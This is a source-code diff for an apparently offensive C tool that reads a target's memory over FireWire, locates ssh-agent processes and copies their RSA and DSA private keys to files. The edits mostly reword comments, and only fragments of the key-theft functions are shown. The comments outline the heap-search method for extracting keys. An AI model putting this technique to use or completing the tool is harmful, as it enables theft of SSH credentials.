@@ -54,7 +54,10 @@
 #include "term.h"
 
 char pagedir[4096];
+// stack_bottom is the pagenumber of the highest stackpage.
+// this is shared between get_process_name and resolve_env.
 addr_t stack_bottom = 0;
+
 // if test_keys = 1, we will test the captured keys on the fly.
 // this may take several seconds, depending on keytype and length!
 int test_keys = 0;
@@ -92,15 +95,17 @@ void dump_page(FILE* f,uint32_t pn, char* page)
 }}}
 #endif
 
-// the following two functions (get_process_name and resolve_env) are
-// using the stack bottom of the given process. i have found that
-// after a process starts and parses its ENV and ARGVs, all those are
-// in the uppermost page of the userspace (adr < 0xc0000000). in this
-// page, the uppermost (-1) argument is the process name (with about
-// five (5) \0 at the end of the string, then environment variables
+// get_process_name and resolve_env are using the stack bottom of the
+// given process:
+// i have found that after a process starts and parses its ENV and ARGVs,
+// all those are in the uppermost page of the userspace (adr < 0xc0000000).
+// in this page, the uppermost (-1) argument is the process name (with
+// about five (5) \0 at the end of the string, then environment variables
 // follow, each separated by a \0. then the ARGVs and then \0\0.
 
 // return the process name in a malloc'ed buffer or NULL, if none.
+// set stack_bottom so successive queries (resolve_env) don't need to
+// search again.
 char* get_process_name(linear_handle h)
 {{{
 	addr_t pn;
@@ -146,8 +151,8 @@ char* get_process_name(linear_handle h)
 }}}
 
 // will try to resolve an environment variable of the given process
-// by looking at the bottom of the stack
-// returns NULL or env-vars contents in an malloced buffer
+// by looking at the bottom of the stack.
+// returns NULL or env-vars contents in an malloced buffer.
 //
 // uses stack_bottom from get_process_name()
 char* resolve_env(linear_handle h, char* envvar)
@@ -225,9 +230,8 @@ char* resolve_env(linear_handle h, char* envvar)
 
 
 // fix a remote bignum to a local bignum:
-// copy all important internal data of struct bignum_st
-//
-// returns malloc'ed bignum
+// copy all important internal data of struct bignum_st.
+// returns malloc'ed bignum.
 BIGNUM* fix_bignum(linear_handle lin, BIGNUM* rb)
 {{{
 	addr_t p;
@@ -292,10 +296,7 @@ BIGNUM* fix_bignum(linear_handle lin, BIGNUM* rb)
 	return b;
 }}}
 
-// steal a RSA key:
-//   copy all important internal data of struct rsa_st
-//
-// copies RSA key to malloc'ed buffer
+// copy all important internal data of a remote struct rsa_st.
 int steal_rsa_key(linear_handle lin, Key* key)
 {{{
 	addr_t p;
@@ -356,19 +357,6 @@ int steal_rsa_key(linear_handle lin, Key* key)
 	key->rsa->dmq1 = fix_bignum(lin, key->rsa->dmq1);
 	key->rsa->iqmp = fix_bignum(lin, key->rsa->iqmp);
 
-	// x,y,z are public
-	// 	p is a random prime
-	// 	q is a random prime
-	// 	n = p*q   (public modulus; bit length of this is of interest)
-	//	e (public exponent): e*n is relatively prime (don't share other factors than 1)
-	//	  e is usually 3 or 65537 (Fermat's F4 number)
-	//	d = f(e,p,q)
-	//
-	//	dmp1:	?
-	//	dmq1:	?
-	//	iqmp:	?
-	// n,e are public key; d is private key
-
 	// check if all bignums were recovered and do some sanitychecks
 	if(key->rsa->n && key->rsa->e && key->rsa->d && key->rsa->p && key->rsa->q && key->rsa->dmp1 && key->rsa->dmq1 && key->rsa->iqmp) {
 		if(test_keys) {
@@ -394,10 +382,7 @@ int steal_rsa_key(linear_handle lin, Key* key)
 	return 0;
 }}}
 
-// steal a DSA key:
-//   copy all important internal data of struct dsa_st
-//
-// copies DSA key to malloc'ed buffer
+// copy all important internal data of a remote struct dsa_st.
 int steal_dsa_key(linear_handle lin, Key* key)
 {{{
 	addr_t p;
@@ -475,8 +460,8 @@ int steal_dsa_key(linear_handle lin, Key* key)
 	return 0;
 }}}
 
-// create a unique filename, consisting of target's 1394-GUID, ssh-agent's username and key's comment
-// and save the key to this file
+// create a unique filename, consisting of target's 1394-GUID, ssh-agent's
+// username and key's comment and save the key to this file.
 void save_key(linear_handle lin, char* key_comment, Key* key)
 {{{
 	uint32_t high;
@@ -535,14 +520,11 @@ void save_key(linear_handle lin, char* key_comment, Key* key)
 
 
 // attack an ssh-agent's address space:
-// 	create a string ala '$HOME/.ssh/'
-// 	search string in heap
+// 	search '$HOME/.ssh/' in the heap
 // 	search string's address in heap (is part of struct identity)
 //	if found:
 //		print identity.death (time of death of this key)
-//		steal identity.key:
-//			steal identity.key.rsa and identity.key.dsa
-//			if one of them ok: save key to file
+//		steal identity.key
 void check_ssh_agent(linear_handle lin)
 {{{
 #	define AGENT_START	0x08000
@@ -714,8 +696,7 @@ void usage(char* argv0)
 }}}
 
 // will scan the targets memory for pagedirs,
-// for each found: use pagedir for linear mapping. 
-//                 in linear address-space: resolve process name
+// for each found:
 //                 if it is an ssh-agent, try to steal keys
 int main(int argc, char**argv)
 {{{
